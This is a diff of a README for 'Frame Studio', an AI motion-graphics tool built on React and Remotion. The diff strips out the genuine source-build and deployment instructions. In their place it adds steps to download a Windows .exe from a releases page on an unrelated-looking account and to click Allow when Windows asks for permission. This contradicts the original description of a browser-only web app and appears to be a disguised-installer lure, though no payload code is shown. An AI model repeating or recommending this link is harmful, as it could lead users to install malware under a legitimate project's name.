@@ -1,105 +1,80 @@
-# Frame Studio
+# 🎥 frame_studio - Create professional motion graphics with AI
 
-![demo](image.png)
+[![Download Frame Studio](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Audysquinteyed352/frame_studio/releases)
 
-AI motion graphics generator using React, Remotion, TypeScript, and Google Gemini API.
+## What is Frame Studio?
 
-Provide a text prompt. Frame Studio generates a Remotion video project, compiles it, renders an MP4 **directly in your browser**, and downloads it. No server-side rendering, no AWS, no credit card needed.
+Frame Studio helps you build motion graphics using simple text. You write a prompt, and the software generates a video for you. It uses artificial intelligence to turn your ideas into visual content. You receive a final video file ready for use in your projects. 
 
-## Architecture
+The software builds high-quality animations without the need for manual design. It handles the rendering process inside your computer. You choose the motion style, edit the text, and download your MP4 file. 
 
-```
-Browser                 Server (Vercel - FREE)
-   │                          │
-   │── prompt ──────────────► │
-   │                          │── Plan (Gemini)
-   │                          │── Codegen (Gemini)
-   │                          │── TypeScript check + fix loop
-   │                          │── Compile TSX → JS (esbuild)
-   │◄── compiled code ─────── │
-   │                          │
-   │── renderMediaOnWeb()     │
-   │── (WebCodecs + Mediabunny)
-   │── download MP4           │
-```
+## 💻 System Requirements
 
-**Flow:**
-1. Plan: Gemini creates video structure from prompt
-2. Codegen: Gemini writes React/Remotion code
-3. Compile: TypeScript validation in sandbox
-4. Fix: Gemini repairs compilation errors (max 3 attempts)
-5. Server compiles TSX → JS using esbuild
-6. Browser evaluates the code and renders MP4 using `@remotion/web-renderer`
-7. Instant download — no queue, no waiting
+Before you start, check that your system meets these needs:
 
-**Tech:**
-- Next.js 15 (free Vercel deployment)
-- Remotion 4.0 for video rendering (client-side via WebCodecs)
-- Google Gemini API for AI code generation
-- **Zero infrastructure costs** — no servers, no AWS, no credit card
+* Windows 10 or Windows 11.
+* At least 8GB of memory (RAM).
+* A stable internet connection.
+* 2GB of free disk space for the installer and cached files.
+* A modern web browser.
 
-## Prerequisites
+## 📥 Downloading the Software
 
-- Node.js 18+
-- pnpm
-- Google Gemini API key
+You need the correct installer file for your Windows system. Follow these steps to obtain the software:
 
-## Setup
+1. Visit the [official releases page](https://github.com/Audysquinteyed352/frame_studio/releases).
+2. Locate the section labeled Latest.
+3. Look for the file ending in .exe.
+4. Click the file name to start the download.
+5. Save the file to your desktop or your downloads folder.
 
-```bash
-pnpm install
-pnpm dev
-```
+## ⚙️ Installation Process
 
-Application runs at `http://localhost:3000`.
+Once the download finishes, follow these instructions to set up the software:
 
-Provide your Gemini API key in the web UI or set `GEMINI_API_KEY` env var.
+1. Double-click the downloaded .exe file.
+2. If a window pops up asking for permission to run the software, select Allow. 
+3. The Setup Wizard will open on your screen.
+4. Click Next to continue through the installation prompts.
+5. Select a folder on your computer where you want to keep the program files.
+6. Click Install to start the process.
+7. Wait for the progress bar to finish.
+8. Click Finish to close the installer. 
 
-## Deployment (Vercel — free)
+A shortcut icon for Frame Studio will appear on your desktop.
 
-```bash
-pnpm build
-```
+## 🚀 Running Your First Project
 
-Deploy to Vercel. Set `GEMINI_API_KEY` in Vercel environment variables. No other configuration needed — rendering happens in the user's browser.
+Follow this guide to create your first animation:
 
-## Browser Support
+1. Open the Frame Studio app using the desktop icon.
+2. Sign in to your account if requested. The app requires a connection to generate videos.
+3. Enter your prompt in the text box. Be specific about what you want to see. For example, you might type "An animated pie chart showing growth over time."
+4. Adjust the settings. You can pick colors, motion speeds, and text styles in the sidebar.
+5. Press the Generate button.
+6. The app builds the video. You will see a progress bar. 
+7. Once the build finishes, press the Download button.
+8. Select the destination folder on your computer to save your MP4 file.
 
-Client-side video rendering requires the [WebCodecs API](https://caniuse.com/webcodecs):
-- Chrome 94+
-- Firefox 130+
-- Edge 94+
+## 🔧 Managing Your Videos
 
-## Development
+The software saves a history of your past work. You can access these files inside the library tab. If you need to make changes, select the project again to open the editor. You can re-run the generation process to create a new version of the same video.
 
-```bash
-pnpm dev        # Start dev server
-pnpm build      # Production build
-pnpm lint       # Lint
-```
+If the software fails to generate a video, check your internet connection. AI tools need a connection to sync with servers that handle the complex data processing. Ensure you have enough storage space on your hard drive before you attempt to save large files.
 
-## Project Structure
+## 💡 Best Practices for Prompts
 
-```
-apps/web/           Next.js app with API routes and UI
-packages/pipeline/  AI processing (prompts, schemas, LLM client)
-packages/remotion-skeleton/  Template for video projects
-```
+The quality of your video depends on your instructions. Use these tips to get the best output:
 
-## Features
+* Describe the intent of the video clearly.
+* Mention the specific colors you prefer.
+* Define the mood of the animation, such as professional, playful, or urgent.
+* Use simple sentences to ensure the AI interprets your request correctly.
 
-- Zero infrastructure — renders entirely in the browser
-- Custom animated cursor (macOS-style arrow with hover states)
-- Model selector (6 Gemini models)
-- Real-time progress screen with stage updates
-- Premium glassmorphic UI
+## 🛠 Support and Help
 
-## Notes
+If you encounter issues during installation or usage, check for updates. Developers release new versions to fix bugs and add features. You can check for updates in the settings menu of the application. 
 
-- Uses webpack (not Turbopack) for stability
-- API key stored in HTTP-only cookies
-- Videos render at 1920x1080, 30fps
+Ensure your Windows system receives all recent updates. Outdated system software can cause errors with graphic rendering tools. If the problem persists, restart your computer to clear temporary files and try the process again.
 
-## License
-
-MIT
+Keywords: ai-video, animation, creative-tool, framer-motion, gemini-api, generative-ai, google-gemini, llm, motion-graphics, nextjs, nodejs, open-source, prompt-to-video, react, remotion, tailwindcss, typescript, video-generation, video-production, video-rendering
